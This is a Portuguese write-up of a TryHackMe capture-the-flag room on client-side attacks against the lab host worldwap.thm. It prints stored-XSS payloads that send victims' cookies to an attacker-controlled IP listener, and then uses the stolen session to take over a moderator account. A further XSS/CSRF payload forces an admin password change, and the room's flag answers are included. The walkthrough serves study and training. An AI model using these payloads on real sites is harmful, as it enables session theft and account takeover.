# Duckware Team - MarsAnalytica
###### Solved by @Antonio-alexandre

> This TryHackMe room is about client-side exploitations

## Desafio: whatsyourname - TryHackMe
#### Introdução

Este desafio visa avaliar habilidades de explorações client-side, abrangendo desde a análise de código JavaScript e manipulação de cookies, até o lançamento de ataques de CSRF (Cross-Site Request Forgery) e XSS (Cross-Site Scripting).

É necessário adicionar o ip da máquina e worldwap.thm em /etc/hosts.

#### Primeiros passos

Com o site aberto, basta rodar o gobuster com o seguinte comando:

`gobuster dir -u http://worldwap.thm/ -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt`

Ele irá varrer todos os endpoints que tem no site.

Fazendo isso se obtém os seguintes endpoints:

[![image.png](https://i.postimg.cc/V6SppFYH/image.png)](https://postimg.cc/WFv5JgqM)

Feito isso, basta ir para a página de registro, entender como está funcionando a lógica.

[![image.png](https://i.postimg.cc/g2DxLzqf/image.png)](https://postimg.cc/211kPftw)

Ao criar um usuário, aparece a seguinte página: 

[![image.png](https://i.postimg.cc/6QP5Cy7m/image.png)](https://postimg.cc/t1hjjRN3)

Nessa página, obtem-se um outro site: `login.worldwap.thm`. É necessário então adicioná-lo ao /etc/hosts também.

Feito isso, basta acessar o site.

Ao acessar o site, aparece apenas uma página vazia. Porém, ao abrir o DevTools (F12), descobre-se um endpoint que é necessário acessar: `login.php`. Fazendo isso:

[![image.png](https://i.postimg.cc/bYxpw6RF/image.png)](https://postimg.cc/HjkfS9RQ)

Voltando para a página de login, pode-se notar no DevTools que ao acessar a página, o site atribui um cookie para o usuário. Isso significa que é possível obter o cookie do moderador através de XSS.

[![image.png](https://i.postimg.cc/zBw68Q1k/image.png)](https://postimg.cc/sQXwJwxB)

Para isso, basta colocar o seguinte payload no campo email do register:

`<img src="empty.png" onerror="fetch('http://10.82.126.149:8000?cookie1='+document.cookie'); ">`

E no campo Name do register, colocar o seguinte payload:

`<script>var i = new Image(); i.src="http://10.82.126.149:8000?cookie2="+btoa(document.cookie);</script>`

Além disso, é necessário iniciar um servidor python com o comando:

`python3.9 -m http.server`

Feito isso:

[![image.png](https://i.postimg.cc/zGVBd9sV/image.png)](https://postimg.cc/Hr1dnPsg)

Agora, basta pegar o cookie que foi concebido, decodificar de base64 e colar o resultado em phpsessid no devtools da pagina login.worldwap.thm.

[![image.png](https://i.postimg.cc/02LRsF6t/image.png)](https://postimg.cc/xcyFGs3H)

Fazendo isso e atualizando a página, aparece o seguinte:

[![image.png](https://i.postimg.cc/tJwf9ng7/image.png)](https://postimg.cc/H8032xXC)

Aparece então a resposta para a primeira pergunta:

##### What is the flag value after accessing the moderator account?

R: ModP@wnEd

Falta então apenas a segunda questão.

Relembrando o que já foi encontrado em worldwap.thm:

[![image.png](https://i.postimg.cc/V6SppFYH/image.png)](https://postimg.cc/WFv5JgqM)

Como pode-se notar, há o endpoint /public. Basta então novamente rodar o gobuster, porém agora em: `http://login.worldwap.thm` e com o comando:

`gobuster dir -u http://login.worldwap.thm -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -x .php`

Fazendo isso:

[![image.png](https://i.postimg.cc/8CLrH2vZ/image.png)](https://postimg.cc/NyfMGPpX)

Basta então acessar o endpoint `/change_password.php`

Fazendo isso:

[![image.png](https://i.postimg.cc/nLKC7v82/image.png)](https://postimg.cc/yJd1C383)

Quando se tenta trocar a senha, aparece essa mensagem e é enviada a seguinte requisição POST ao servidor:


```
POST /change_password.php HTTP/1.1
Host: login.worldwap.thm
User-Agent: Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:131.0) Gecko/20100101 Firefox/131.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/png,image/svg+xml,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Content-Type: application/x-www-form-urlencoded
Content-Length: 16
Origin: http://login.worldwap.thm
Connection: keep-alive
Referer: http://login.worldwap.thm/change_password.php
Cookie: PHPSESSID=2npllscdqvfbm9t3tos9tccico
Upgrade-Insecure-Requests: 1
Priority: u=0, i

new_password="aba"
```

No site também há uma página onde contém um chatbot de Admin:

[![image.png](https://i.postimg.cc/5NZ0RPf4/image.png)](https://postimg.cc/D8PnWPWH)

Testando um XSS simples nele, ocorre o seguinte:

[![image.png](https://i.postimg.cc/PqM5NTYN/image.png)](https://postimg.cc/rdKkP6hL)


É possível então utilizar o seguinte comando para forçar essa mudança de senha:

`<script>fetch('/change_password.php',{method:'POST',headers:{'Content-Type':'application/x-www-form-urlencoded'},body:"new_password=password"});</script>`

Executando isso, basta voltar ao site de login original, e tentar logar na página de admin com a senha `password`:

[![image.png](https://i.postimg.cc/V6rsgM2r/image.png)](https://postimg.cc/JD8W4yrM)

[![image.png](https://i.postimg.cc/xjmTbvK5/image.png)](https://postimg.cc/QVXr2WYK)

Obtendo assim a resposta da segunda questão:

##### 2 - What is the flag value after accessing the admin panel?

R: AdM!nP@wnEd

### Conclusão

Foi um desafio de certa forma complexo, mas divertido de se completar. Exige um pouco de conhecimento de XSS mas também como manipular cookies através de CSRF. Extremamente interessante e interativo também.